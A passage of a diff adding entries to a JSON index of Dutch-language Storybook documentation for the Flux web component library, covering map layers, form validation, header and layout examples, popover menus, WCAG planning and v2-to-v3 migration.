+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-switcher--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-vector-layer-features-layer--documentatie",
+            "title": "map/layer/vector-layer/features-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-vector-layer-features-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-vector-layer-wfs-layer--documentatie",
+            "title": "map/layer/vector-layer/wfs-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-vector-layer-wfs-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-wms-layer-image-wms-layer--documentatie",
+            "title": "map/layer/wms-layer/image-wms-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-wms-layer-image-wms-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-wms-layer-tiled-wms-layer--documentatie",
+            "title": "map/layer/wms-layer/tiled-wms-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-wms-layer-tiled-wms-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-wms-layer-wms-style--documentatie",
+            "title": "map/layer/wms-layer/wms-style",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-wms-layer-wms-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-wms-layer-xyz-wms-layer--documentatie",
+            "title": "map/layer/wms-layer/xyz-wms-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-wms-layer-xyz-wms-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-wmts-layer--documentatie",
+            "title": "map/layer/wmts-layer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-wmts-layer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-legend--documentatie",
+            "title": "map/legend",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-legend--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-legend-item--documentatie",
+            "title": "Map/legend-item",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-legend-item--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-loading-indicator--documentatie",
+            "title": "map/loading-indicator",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-loading-indicator--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-map--documentatie",
+            "title": "map/map",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-map--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-overview-map--documentatie",
+            "title": "map/overview-map",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-overview-map--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-search--documentatie",
+            "title": "map/search",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-search--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-select-location--documentatie",
+            "title": "map/select-location",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-select-location--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-side-sheet-side-sheet--documentatie",
+            "title": "map/side-sheet/side-sheet",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-side-sheet-side-sheet--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-side-sheet-side-sheet-menu-item--documentatie",
+            "title": "map/side-sheet/side-sheet-menu-item",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-side-sheet-side-sheet-menu-item--documentatie",
+            "added": null
+          },
+          {
+            "id": "ontwerp-form-custom-validation--documentatie",
+            "title": "Ontwerp/Form/Custom Validation",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-form-custom-validation--documentatie",
+            "added": "# Form - Custom Validatie\n\n> Meer info over validatie binnen onze form componenten vind je hier: [Form - Validatie](/docs/ontwerp-form-validation--documentatie)\n\nOm gebruik te maken van custom validatie moet je een nieuwe component maken dat overerft van één van onze form controls.<br/>\nAan dit component kan je je custom validator toevoegen. Via de `customError` ValidityState key kan je een error message linken aan je custom validator.\n\n## Extra informatie\n\nHet is nodig om een custom component te maken voor elke custom validator die je wil toevoegen:<br/>\n- De validators worden toegevoegd op de form controls d.m.v. een statische array. Dit betekent dat als je een custom validator toevoegt aan een form control, deze validator zal toegevoegd worden aan alle form controls van dit type.<br/>\n- De form controls maken gebruik van de [ValidityState interface](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) waardoor er maximum 1 custom validator toegevoegd kan worden aan een form control.<br/>\nBij het toevoegen van een 2de custom validator zal de eerste custom validator overschreven worden.<br/>\n\n## Voorbeeld\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-form-demo--documentatie",
+            "title": "Ontwerp/Form/Demo",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-form-demo--documentatie",
+            "added": "# Form - Demo\n\n> Meer info over validatie binnen onze form componenten vind je hier: [Form - Validatie](/docs/ontwerp-form-validation--documentatie)\n\n> Uitgebreid voorbeeld hoe je form data eenvoudiger kan parsen en instellen vind je op de [Form Data pagina](/docs/ontwerp-form-form-data--documentatie).\n\nDit is een voorbeeld van hoe de form componenten in een form gebruikt kunnen worden.<br/>\nDe submitted waarden worden in deze demo in de console gelogd.\n\n## Componenten\n\n- [vl-input-field](/docs/components-form-input-field--documentatie)\n- [vl-input-field-masked](/docs/components-form-input-field-masked--documentatie)\n- [vl-textarea](/docs/components-form-textarea--documentatie)\n- [vl-datepicker](/docs/components-form-datepicker--documentatie)\n- [vl-select-rich](/docs/components-form-select-rich--documentatie)\n- [vl-select](/docs/components-form-select--documentatie)\n- [vl-radio-group](/docs/components-form-radio-group--documentatie)\n- [vl-upload](/docs/components-form-upload--documentatie)\n- [vl-checkbox](/docs/components-form-checkbox--documentatie)\n- [vl-form-message](/docs/components-form-form-message--documentatie)\n- [vl-form-label](/docs/components-form-form-label--documentatie)\n\n## Native elementen\n\nGebruik voor de volgende elementen native HtmlElements met css classes:\n- Form: native HTMLFormElement met class `vl-form` - `<form class=\"vl-form\">`\n- Action Group: native HtmlDivElement met class `vl-action-group` - `<div class=\"vl-action-group\">`\n- Button: `vl-button` component - [documentatie](/docs/components-atom-button--documentatie)\n\n## Grid\n\nMaak voor het opbouwen van de grid structuur gebruik van de [vl-grid classes](/docs/styles-layout-afnemers-grid--documentatie).<br/>\nPlaats deze op native HtmlDivElements.\n\n## Form data\n\nGebruik de [parseFormData](/docs/ontwerp-form-form-data--documentatie) helper functie om de form data te verzamelen.<br/>\nIndien je meer controle nodig hebt kan je zelf de [FormData](https://developer.mozilla.org/en-US/docs/Web/API/FormData) API gebruiken.\n\n{`\n    Indien je een form control wrapped in een custom component, zorg er voor dat dit custom component geen Shadow DOM\n    heeft.<br/>\n    Als dit custom component een Shadow DOM heeft, zal het native HtmlFormElement de form control niet meer vinden.\n`}\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-form-form-data--documentatie",
+            "title": "Ontwerp/Form/Form Data",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-form-form-data--documentatie",
+            "added": "# Form - Data\n## formaat\n## parseFormData(formElement)\n### Gebruik\n### Voorbeeld resultaat\n## setFormData(formElement, data)\n### Gebruik\n### Checkbox\n## Voorbeeld\n(137 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "ontwerp-form-validation--documentatie",
+            "title": "Ontwerp/Form/Validation",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-form-validation--documentatie",
+            "added": "# Form - Validation\n\n> Uitgebreid voorbeeld van validatie met onze form componenten vind je op de [Form Demo pagina](/docs/ontwerp-form-demo--documentatie).\n\n> Voorbeeld om custom validatie te schrijven vind je op de [Form Custom Validation pagina](/docs/ontwerp-form-custom-validation--documentatie).\n\nOnze form componenten maken gebruik van open-wc's [form participation](https://github.com/open-wc/form-participation) om form validatie te bekomen met web components die gebruik maken van native HTML form elements.\n\nDeze library is gebaseerd op [native HTML form validatie](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation) en [Constraint Validation API](https://developer.mozilla.org/en-US/docs/Web/API/Constraint_validation) en blijft zo dicht mogelijk bij de native HTML form validatie.\n\nDaarnaast voorzien we ook de [`parseFormData()` helper functie](/docs/ontwerp-form-form-data--documentatie#parseformdataformelement-form-multiformcontrolnames-string) om met de [FormData API](https://developer.mozilla.org/en-US/docs/Web/API/FormData) om te gaan.\n\n## ValidityState in Formuliervalidatie\n\nEen essentieel onderdeel van de validatie is de [ValidityState interface](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState), onderdeel van de native Validation API.\nDit object geeft de huidige validatiestatus van een form control weer en kan worden gebruikt om een gedetailleerde foutmelding te verkrijgen.\n\nDie foutmeldingen worden getoond door de [`vl-form-message` component](/docs/components-form-form-message--documentatie) die de `ValidityState` van de form control controleert.\n\n## Attributen van ValidityState\n\nHieronder een overzicht van de gebruikte attributen van [ValidityState](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState#instance_properties) met hun betekenis en bijhorende [validation attributen](https://developer.mozilla.org/en-US/docs/Web/HTML/Constraint_validation#validation-related_attributes):\n\n- `customError`: als je custom validatie instelt, [zie hier](/docs/ontwerp-form-custom-validation--documentatie) hoe je zelf een custom validator schrijft.\n- `patternMismatch`: als de waarde niet overeenkomt met het patroon dat is ingesteld door het `pattern` attribuut.\n- `rangeOverflow`: als de waarde hoger is dan de waarde die is gespecifieerd door het `max` attribuut.\n- `rangeUnderflow`: als de waarde lager is dan de waarde die is gespecifieerd door het `min` attribuut.\n- `tooLong`: als de waarde langer is dan de maximale lengte die is gespecifieerd door het `maxlength` attribuut.\n- `tooShort`: als de waarde korter is dan de minimale lengte die is gespecifieerd door het `minlength` attribuut.\n- `valueMissing`: als er een waarde is vereist, maar het invoerveld leeg is. Gespecificeerd door het `required` attribuut.\n- `valid`: als de waarde geldig is en geen van de bovenstaande fouten heeft.\n\n## Gebruik van ValidityState in Onze Componenten\n\nOm de validatiestatus van een form control te controleren, moet je:\n- een `id` attribuut toevoegen aan de form control\n- een constraint attribuut toevoegen aan de form control. Dit attribuut moet overeenkomen met de naam van de eigenschap van de `ValidityState` die je wil controleren, bv. `required`-attribuut voor `valueMissing` of `pattern`-attribuut voor `patternMismatch`.\n- een `for` attribuut toevoegen aan de `vl-form-message` component. Dit attribuut moet overeenkomen met de `id` van de form control.\n- het attribuut `state` instellen op de `vl-form-message` component. Dit attribuut moet overeenkomen met de naam van de eigenschap van de `ValidityState` die je wil controleren.\n\nVervolgens zal de `vl-form-message` component de foutmelding tonen die is ingesteld voor de `ValidityState` van de form control wanneer gevalideerd wordt.\nStandaard gebeurt dit wanneer de form gesubmit wordt door bv.:\n- op de submit knop te klikken\n- de enter toets in te drukken terwijl een form control focus heeft\n\nJe kan ook de [`checkValidity` methode](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement/checkValidity) van de form control aanroepen om de validatiestatus van de form control te controleren.\n\n## Enkele voorbeelden van ValidityState:\n\n### Ontbrekende waarde\n\nOp het moment dat een veld verplicht is en geen waarde heeft, zal de `valueMissing` eigenschap van de `ValidityState` van de form control `true` zijn.\nEen veld met een ontbrekende waarde zal een foutmelding tonen die is ingesteld met de `vl-form-message` component waarvan de `for` eigenschap overeenkomt met de `id` van de form control.\nDe form control moet ook het `required` attribuut hebben.\n\nIn onderstaande voorbeeld: druk op `enter` zonder iets in te vullen om de foutmelding te zien.\n\n\n### Patroon komt niet overeen\n\nAls een veld een patroon heeft (attribuut `pattern`) en de waarde van het veld komt niet overeen met het patroon,\nzal de `patternMismatch` eigenschap van de `ValidityState` van de form control `true` zijn en wordt ook de foutmelding getoond.\n\nIn onderstaande voorbeeld: vul een cijfer of speciaal teken in en druk op `enter` om de foutmelding te zien.\n\n\n## Aanbevelingen voor Validatie\n\nVóór ingave, informeer de gebruiker over de validatiecriteria van een veld door een hint te tonen in de buurt van het veld.\n\nNa validatie, vermeld altijd duidelijk waarom een veld niet geldig is en geef de gebruiker een duidelijke hint over hoe het probleem kan worden opgelost.\n\n## Lijst componenten met onze ValidityState implementatie\n\n- [vl-input-field](/docs/components-form-input-field--documentatie)\n- [vl-input-field-masked](/docs/components-form-input-field-masked--documentatie)\n- [vl-textarea](/docs/components-form-textarea--documentatie)\n- [vl-textarea-rich](/docs/components-form-textarea-rich--documentatie)\n- [vl-datepicker](/docs/components-form-datepicker--documentatie)\n- [vl-select-rich](/docs/components-form-select-rich--documentatie)\n- [vl-select](/docs/components-form-select--documentatie)\n- [vl-radio-group](/docs/components-form-radio-group--documentatie)\n- [vl-upload](/docs/components-form-upload--documentatie)\n- [vl-checkbox](/docs/components-form-checkbox--documentatie)"
+          },
+          {
+            "id": "ontwerp-functional-header-voorbeeld-met-back-en-tabs--documentatie",
+            "title": "Ontwerp/Functional Header/Voorbeeld Met Back En Tabs",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-functional-header-voorbeeld-met-back-en-tabs--documentatie",
+            "added": "# Functional Header - Voorbeeld Met Back En Tabs\n\nIn dit voorbeeld tonen we hoe een [vl-tabs](/docs/components-block-tabs-tabs--documentatie) component kan toegevoegd worden aan de [vl-functional-header](/docs/components-block-functional-header--documentatie) in combinatie met de back button.\n\nIn dit geval wordt custom CSS meegegeven om deze layout mogelijk te maken.\n\n## Componenten\n\n- [vl-functional-header](/docs/components-block-functional-header--documentatie)\n- [vl-tabs](/docs/components-block-tabs-tabs--documentatie)\n\n## Demo\n\n\n<details open>\n<summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-functional-header-voorbeeld-met-button--documentatie",
+            "title": "Ontwerp/Functional Header/Voorbeeld Met Button",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-functional-header-voorbeeld-met-button--documentatie",
+            "added": "# Functional Header - Voorbeeld Met Button\n\nIn dit voorbeeld tonen we hoe een [vl-button](/docs/components-atom-button--documentatie) component kan toegevoegd worden aan de [vl-functional-header](/docs/components-atom-functional-header--documentatie).\n\nWe gebruiken een [vl-button](/docs/components-atom-button--documentatie) component gecombineerd met de [vl-group](/docs/styles-layout-afnemers-group--documentatie) stijl om een actie knop rechts uit te lijnen naast een breadcrumb of andere variant.\n\nIn dit geval wordt custom CSS meegegeven om deze layout mogelijk te maken.\n\n## Componenten\n\n- [vl-functional-header](/docs/components-block-functional-header--documentatie)\n- [vl-button](/docs/components-atom-button--documentatie)\n\n## Stijlen\n\n- [vl-group](/docs/styles-layout-afnemers-group--documentatie)\n\n## Demo\n\n\n<details open>\n<summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-functional-header-voorbeeld-met-search--documentatie",
+            "title": "Ontwerp/Functional Header/Voorbeeld Met Search",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-functional-header-voorbeeld-met-search--documentatie",
+            "added": "# Functional Header - Voorbeeld Met Search\n\nIn dit voorbeeld tonen we hoe een [vl-search](/docs/components-block-search--documentatie) component kan toegevoegd worden aan de [vl-functional-header](/docs/components-block-functional-header--documentatie).\n\nWe gebruiken een [vl-search](/docs/components-block-search--documentatie) component gecombineerd met de [vl-group](/docs/styles-layout-afnemers-group--documentatie) stijl om een zoekveld rechts uit te lijnen naast een breadcrumb of andere variant.\n\nIn dit geval wordt custom CSS meegegeven om deze layout mogelijk te maken.\n\n## Componenten\n\n- [vl-functional-header](/docs/components-block-functional-header--documentatie)\n- [vl-search](/docs/components-block-search--documentatie)\n\n## Stijlen\n\n- [vl-group](/docs/styles-layout-afnemers-group--documentatie)\n\n## Demo\n\n\n<details open>\n<summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-map-niet-lambert-72-lagen--documentatie",
+            "title": "Ontwerp/Map/Niet-Lambert-72-lagen",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-map-niet-lambert-72-lagen--documentatie",
+            "added": "# Map - niet-Lambert-72 lagen\n\nDit is een voorbeeld van hoe je niet-lambert-72 lagen kan toevoegen aan een kaart.\n\n## Componenten\n\n- [vl-map](/docs/map-map--documentatie)\n- [vl-map-baselayer-grb-gray](/docs/map-baselayer-baselayer-grb-gray--documentatie)\n- [vl-map-tiled-wms-layer](/docs/map-layer-wms-layer-tiled-wms-layer--documentatie)\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-pagina-layout-voorbeeld--documentatie",
+            "title": "Ontwerp/Pagina Layout/Voorbeeld",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-pagina-layout-voorbeeld--documentatie",
+            "added": "# Pagina layout\n\n## Standaard layout\n\nDit is de standaard layout voor applicaties. Gebruik de alternatieve \"Volledige breedte\" variant enkel indien deze layout te smal is om alle content duidelijk te visualiseren.\n\n<details open>\n    <summary>Code</summary>\n    <Source\n        language=\"html\"\n        dark\n        format={true}\n        code={`\n<html>\n    <body>\n        <main>\n            <vl-template>\n                <vl-header slot=\"header\"></vl-header>\n                <div slot=\"main\">\n                    <vl-functional-header title=\"Page Layout\">...</vl-functional-header>\n                    <section class=\"vl-section\">\n                        <div class=\"vl-content-block\">...</div>\n                    </section>\n                </div>\n                <vl-footer slot=\"footer\"></vl-footer>\n            </vl-template>\n        </main>\n    </body>\n</html>\n        `}\n    ></Source>\n</details>\n\n## Volledige breedte\n\nDit is een layout voor applicaties die de volledige schermbreedte nodig hebben. Gebruik dit enkel wanneer de standaard layout niet mogelijk is, bijvoorbeeld in het geval van uitgebreide data tabellen.\n\nVoeg hiervoor de volgende attributen toe:\n\n- `full-width` op het `<vl-functional-header>` component\n- de class `vl-content-block--full-width` op alle content blokken\n\n<details open>\n    <summary>Code</summary>\n    <Source\n        language=\"html\"\n        dark\n        format={true}\n        code={`\n<html>\n    <body>\n        <main>\n            <vl-template>\n                <vl-header slot=\"header\"></vl-header>\n                <div slot=\"main\">\n                    <vl-functional-header title=\"Page Layout\" full-width>...</vl-functional-header>\n                    <section class=\"vl-section\">\n                        <div class=\"vl-content-block vl-content-block--full-width\">...</div>\n                    </section>\n                </div>\n                <vl-footer slot=\"footer\"></vl-footer>\n            </vl-template>\n        </main>\n    </body>\n</html>\n        `}\n    ></Source>\n</details>"
+          },
+          {
+            "id": "ontwerp-popover-menu--documentatie",
+            "title": "Ontwerp/Popover/Menu",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-popover-menu--documentatie",
+            "added": "# Popover - Menu\n\nEen popover-menu wordt gebruikt om extra acties weer te geven die niet direct zichtbaar zijn.<br/>\nHet wordt meestal afgebeeld mbv een kebab menu icoon (drie verticale punten).\n\n## Gebruik\n\nHet popover-menu wordt gebruikt wanneer er beperkte ruimte is en niet alle acties direct weergeven kunnen worden.\n\n## Ontwerp\n\n- Icoon: Het menu wordt meestal afgebeeld mbv een kebab menu icoon (drie verticale punten).\n\n- Plaatsing: Het menu kan worden geplaatst in de linkerbovenhoek, rechterbovenhoek of elders op de pagina, afhankelijk\n  van het ontwerp en de context.\n\n- Interactie: Door op het icoon te klikken, wordt het menu geopend en de extra acties weergegeven.\n  Het menu kan gesloten worden door opnieuw op het icoon te klikken, of ergens buiten het menu.\n\n## Voorbeeld\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-popover-menu-accordion--documentatie",
+            "title": "Ontwerp/Popover/Menu Accordion",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-popover-menu-accordion--documentatie",
+            "added": "# Popover - Menu Accordion\n\nDe accordion wordt gebruikt om inhoud te organiseren in een uitklapbaar formaat.<br/>\nElke accordion kan een popover-menu bevatten dat specifieke acties aanbiedt.\n\n## Gebruik\n\nDe accordion met popover-menu wordt gebruikt om inhoud te structureren en gebruikers de mogelijkheid te geven om specifieke acties uit te voeren.\n\n## Ontwerp\n\n- Accordion: elke accordion bestaat uit een titel en een inhoudsgebied dat kan worden uit- of ingeklapt.\n\n- Popover-menu: elke accordion kan een popover-menu bevatten dat specifieke acties aanbiedt.\n  Het menu wordt meestal afgebeeld mbv een kebab menu icoon (drie verticale punten).\n\n- Interactie: gebruikers kunnen op de titel klikken om de accordion uit- of in te klappen.\n  Door op het popover-menu icoon te klikken wordt het menu geopend en de extra acties weergegeven.\n\n## Voorbeeld\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "ontwerp-popover-menu-info-tile--documentatie",
+            "title": "Ontwerp/Popover/Menu Info Tile",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/ontwerp-popover-menu-info-tile--documentatie",
+            "added": "# Popover - Menu Info Tile\n\nDe info tile wordt gebruikt om inhoud te organiseren in een uitklapbaar formaat.<br/>\nElke info tile kan een popover-menu bevatten dat specifieke acties aanbiedt.\n\n## Gebruik\n\nDe info tile met popover-menu wordt gebruikt om inhoud te structureren en gebruikers de mogelijkheid te geven om specifieke acties uit te voeren.\n\n## Ontwerp\n\n-   Info tile: elke info tile bestaat uit een titel, subtitel en een inhoudsgebied dat optioneel kan worden uit- of ingeklapt.\n\n-   Popover-menu: elke info tile kan een popover-menu bevatten dat specifieke acties aanbiedt.\n    Het menu wordt meestal afgebeeld mbv een kebab menu icoon (drie verticale punten).\n\n-   Interactie: gebruikers kunnen op de titel klikken om de info tile uit- of in te klappen, indien deze het attribuut `toggleable` heeft.\n    Door op het popover-menu icoon te klikken wordt het menu geopend en de extra acties weergegeven.\n\n## Voorbeeld\n\n\n<details open>\n    <summary>Code</summary>\n</details>"
+          },
+          {
+            "id": "planning-aanpak-v2-v3--documentatie",
+            "title": "Planning/Aanpak v2, v3, ...",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/planning-aanpak-v2-v3--documentatie",
+            "added": "# Aanpak v2, v3, ...\n## Inhoudstafel\n## Waarom v2\n### Element complicatie\n### JavaScript complicatie\n### SCSS complicatie\n## Waarom 'Next' Componenten\n## 'Next' Conventies\n## v2 vs. v3\n## v2 Release\n## v3 Release\n(172 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "planning-aanpak-verbeteringen-2025--documentatie",
+            "title": "Planning/Aanpak Verbeteringen 2025",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/planning-aanpak-verbeteringen-2025--documentatie",
+            "added": "# Aanpak Verbeteringen 2025\n\n## Algemeen: dichter bij de teams staan\n\n - UX-werk voor nieuwe onderdelen / toepassingen\n\n - 'pragmatische' code-reviews voordat toepassingen in productie gaan<br/>\n    → aanbevelingen en best practices geven<br/>\n    → aanduiden met niveau's: brons(+) / zilver(+) / goud(+)\n\n - introductie van een Frontend Guild met een frontend 'spoc' per team<br/>\n    → WCAG / testing / CSP\n\n\n## WCAG\n\n### Nieuwe WCAG Aanpak\n\n - documentatie in Storybook<br/>\n    → WCAG aanpak - Europees minimaal AA (ineens 2.2)<br/>\n    → vereisten documenteren - minimaal brons voor interne toepassingen / zilver+ voor publieke\n\n - presentatie (eventueel door Gijs) voor de ontwikkelaars rond WCAG\n    → niet weerhouden na met Gijs samen gezeten te hebben\n    → het is beter met een beperkte groep rond concrete acties samen te zitten\n\n - toepassen op de Flux-componenten waarbij we WCAG gaan behandelen conform andere feature en bug tickets\n\n - als eerste eigen Flux actie, de 'compliance'-componenten (privacy, cookie-consent, accessibility, ...)\n   verbeteren op WCAG vlak<br/>\n    → tickets uit de backlog wegwerken<br/>\n    → block- en atom-componenten die in de 'compliance'-componenten gebruikt worden ineens mee aanpakken\n\n - op basis van het voorgaande: bouwen wij (Flux) onze WCAG kennis op zodat we zelf (basis) reviews van nieuwe\n   (en bestaande) toepassingen kunnen doen<br/>\n    → we doen dan WCAG aanbevelingen, waaronder deels verplichte verbeteringen<br/>\n    → iteratief wordt de toepassing zo verbeterd alvorens ze in productie gaat<br/>\n    → een finale review voor eerste in productie stelling dient nog door Gijs te gebeuren, hij blijft de expert\n\n\n### WCAG Verleden: waar staan we\n\n - de toepassingen voldoen aan de wettelijke vereisten<br/>\n    → Gijs deed reviews en daar volgde een toegankelijkheidsverklaring uit die opgenomen werd in de toepassing<br/>\n    → Gijs maakte tickets aan om verbeteringen door te voeren\n\n - de tickets werden minimaal opgenomen<br/>\n    → geen prioriteit<br/>\n    → is een kost met niet persé een zichtbare verbetering\n\n - bij Flux is er een hele backlog van WCAG tickets (+130)<br/>\n    → we namen die in het verleden beperkt op<br/>\n    → een deel van de tickets overlapt of zijn out-dated (de component bestaat niet meer)\n\n\n### WCAG Referenties\n\n#### Specificaties\n\n[WCAG 2.2 Nederlandstalige Specificatie](https://www.w3.org/Translations/WCAG22-nl/).\n\n[EN 301 549](https://www.etsi.org/deliver/etsi_en/301500_301599/301549/03.02.01_60/en_301549v030201p.pdf)\n\n#### Overheid\n\n[Inter - het Vlaams Expertisecentrum Toegankelijkheid](https://www.vlaanderen.be/inter/toolbox-toegankelijke-steden-en-gemeenten/algemeen-bestuur-dienstverlening-en-communicatie/digitale-toegankelijkheid/richtlijnen-voor-toegankelijkheid-van-webcontent-wcag).\n\n[GOV UK WCAG Understanding](https://www.gov.uk/service-manual/helping-people-to-use-your-service/understanding-wcag)\n\n#### Algemeen\n\n[Mozilla WCAG Accessibility](https://developer.mozilla.org/en-US/docs/Web/Accessibility)\n\n[Mozilla WCAG Understanding](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Guides/Understanding_WCAG)\n\n[W3 WAI](https://www.w3.org/WAI/)"
+          },
+          {
+            "id": "planning-historiek-toekomst--documentatie",
+            "title": "Planning/Historiek & Toekomst",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/planning-historiek-toekomst--documentatie",
+            "added": "# Historiek & Toekomst\n## Inhoudstafel\n## Aanpak\n## Planning 2025\n## Verleden\n### Q2 2024 tem Q1 2025\n### Q4 2023 en Q1 2024\n## Historisch\n### 01/2023 - 09/2023\n### 07/2022 - 12/2022\n### 07/2021 - 06/2022\n### 01/2020 - 06/2021\n### ... - 2019\n(131 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "planning-van-v2-naar-v3-beschikbaar--documentatie",
+            "title": "Planning/Van v2 naar v3 - beschikbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/planning-van-v2-naar-v3-beschikbaar--documentatie",
+            "added": "# Van v2 naar v3 - beschikbaar\n\n## Inhoudstafel\n\n- [Aanpak](#aanpak)\n- [Geïmpacteerde Web Componenten](#geïmpacteerde-web-componenten)\n\n\n## Aanpak\n\nOp deze pagina vind je een overzicht van de web componenten die geïmpacteerd zijn door de migratie van\nv2 naar v3 en die reeds beschikbaar zijn.\n\nHieronder vind je alfabetisch, per component, een tabel met daarin een overzicht van wat er in v2 en v3\nbeschikbaar is (zal zijn), je kan doorklikken op de naam om naar de documentatie van die component te gaan.\n\n- elke component is ontdubbeld, de legacy variant staat in een donkere rij, de next variant in de erop volgende\nwitte rij\n- voor de next variant staat gespecifieerd sinds welke release hij beschikbaar is\n- typisch hebben de legacy en de next variant dezelfde naam, maar niet altijd\n- momenteel zijn er enkel v1 en v2 releases, wat er zal gebeuren in v3 is informatief; er is nog geen v3 beschikbaar\n\n\n## Geïmpacteerde Web Componenten\n\n### Footer\n\n`Footer [legacy]` wordt vervangen door `Footer [next]`.\n\n<table  style={{width: 100 + '%'}}>\n    <tr>\n        <th>Naam</th>\n        <th>Toestand</th>\n        <th>v2 - Artifact</th>\n        <th>v2 - Gebruik</th>\n        <th>v3 - Artifact</th>\n        <th>v3 - Gebruik</th>\n    </tr>\n    <tr>\n        <td>[Footer [legacy]](/docs/components-compliance-footer--documentatie)</td>\n        <td>deprecated</td>\n        <td>components/compliance</td>\n        <td><code>{`<vl-footer>`}</code></td>\n        <td>-</td>\n        <td>-</td>\n    </tr>\n    <tr>\n        <td>[Footer [next]](/docs/components-compliance-footer-next--documentatie)</td>\n        <td>release v2.3.0</td>\n        <td>components/compliance/next</td>\n        <td><code>{`<vl-footer-next>`}</code></td>\n        <td>components/compliance</td>\n        <td><code>{`<vl-footer>`}</code></td>\n    </tr>\n</table>\n\n### Header\n\n`Header [legacy]` wordt vervangen door `Header [next]`.\n\n<table  style={{width: 100 + '%'}}>\n    <tr>\n        <th>Naam</th>\n        <th>Toestand</th>\n        <th>v2 - Artifact</th>\n        <th>v2 - Gebruik</th>\n        <th>v3 - Artifact</th>\n        <th>v3 - Gebruik</th>\n    </tr>\n    <tr>\n        <td>[Header [legacy]](/docs/components-compliance-header--documentatie)</td>\n        <td>deprecated</td>\n        